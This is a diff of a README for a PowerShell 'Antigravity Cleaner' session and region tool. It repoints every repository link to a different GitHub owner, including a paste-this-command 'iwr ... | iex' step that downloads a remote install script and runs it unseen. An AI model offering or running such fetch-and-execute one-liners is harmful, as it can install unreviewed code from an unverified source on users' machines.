@@ -4,9 +4,9 @@
   <img src="docs/images/banner.png" alt="Antigravity Cleaner Banner" width="100%">
   <br>
   
-  [![Version](https://img.shields.io/badge/Version-4.1.0-blue?style=for-the-badge)](https://github.com/tawroot/antigravity-cleaner/releases)
+  [![Version](https://img.shields.io/badge/Version-4.1.0-blue?style=for-the-badge)](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/releases)
   [![License](https://img.shields.io/badge/License-TACL-red.svg?style=for-the-badge)](docs/LICENSE.md)
-  [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg?style=for-the-badge&logo=platform.sh)](https://github.com/tawroot/antigravity-cleaner)
+  [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg?style=for-the-badge&logo=platform.sh)](https://github.com/LCW0NJUPT/antigravity-cleaner-macos)
   [![Language](https://img.shields.io/badge/Language-PowerShell-yellow.svg?style=for-the-badge&logo=powershell)]()
   [![Security](https://img.shields.io/badge/Security-Zero%20Telemetry-green.svg?style=for-the-badge&logo=shields)](docs/SECURITY.md)
 </div>
@@ -97,7 +97,7 @@ Stop fearing Windows re-installs. Keep your logins alive.
 Open PowerShell and paste this command. It will download the latest core and create a shortcut on your Desktop.
 
 ```powershell
-iwr https://raw.githubusercontent.com/tawroot/antigravity-cleaner/main/install.ps1 -useb | iex
+iwr https://raw.githubusercontent.com/LCW0NJUPT/antigravity-cleaner-macos/main/install.ps1 -useb | iex
 ```
 
 <div align="center">
@@ -107,8 +107,8 @@ iwr https://raw.githubusercontent.com/tawroot/antigravity-cleaner/main/install.p
 
 ### Option 2: Manual (Git)
 ```powershell
-git clone https://github.com/tawroot/antigravity-cleaner.git
-cd antigravity-cleaner
+git clone https://github.com/LCW0NJUPT/antigravity-cleaner-macos.git
+cd antigravity-cleaner-macos
 .\Antigravity.ps1
 ```
 
@@ -126,11 +126,11 @@ For a detailed step-by-step walkthrough of every module (Session Manager, Region
 ## 📈 Star History
 We are growing fast! Thank you for your support.
 <br>
-<a href="https://star-history.com/#tawroot/antigravity-cleaner&Date">
+<a href="https://star-history.com/#LCW0NJUPT/antigravity-cleaner-macos&Date">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=tawroot/antigravity-cleaner&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=tawroot/antigravity-cleaner&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=tawroot/antigravity-cleaner&type=Date" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date&theme=dark" />
+   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date" />
+   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date" />
  </picture>
 </a>
 
@@ -162,16 +162,16 @@ If this tool saved you hours of debugging or fixed your region-locked account, p
 We welcome feature suggestions and bug reports!
 
 **How to Contribute:**
-1.  **Feature Requests:** Open a [Discussion](https://github.com/tawroot/antigravity-cleaner/discussions) on GitHub.
-2.  **Bug Reports:** Open an [Issue](https://github.com/tawroot/antigravity-cleaner/issues) with detailed steps to reproduce.
+1.  **Feature Requests:** Open a [Discussion](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/discussions) on GitHub.
+2.  **Bug Reports:** Open an [Issue](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/issues) with detailed steps to reproduce.
 3.  **Code Contributions:** While we appreciate the interest, please note that direct code contributions (PRs) are currently not accepted due to the proprietary nature of the license. However, your ideas and feedback are highly valued!
 
 ---
 
 ## 📞 Contact & Community
 *   **Telegram Channel:** [t.me/panbehnet](https://t.me/panbehnet) - Updates, tips, and support.
-*   **GitHub Issues:** [Report bugs or request features](https://github.com/tawroot/antigravity-cleaner/issues).
-*   **GitHub Discussions:** [Join the conversation](https://github.com/tawroot/antigravity-cleaner/discussions).
+*   **GitHub Issues:** [Report bugs or request features](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/issues).
+*   **GitHub Discussions:** [Join the conversation](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/discussions).
 
 ---
 
